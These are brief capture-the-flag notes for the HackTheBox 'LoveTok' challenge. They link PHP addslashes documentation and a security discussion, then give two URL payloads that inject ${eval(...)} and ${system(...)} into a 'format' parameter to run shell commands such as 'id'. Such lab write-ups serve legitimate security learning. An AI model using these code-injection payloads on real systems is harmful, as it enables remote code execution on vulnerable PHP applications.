# HackTheBox LoveTok



https://www.php.net/manual/en/function.addslashes.php


exploit search: 
php addslashes exploit
https://security.stackexchange.com/questions/263114/php-is-addslashes-in-eval-really-that-unsafe


/?format=${eval($_GET[1])}&1=system("id");

/?format=${system($_GET[1])}&1=id

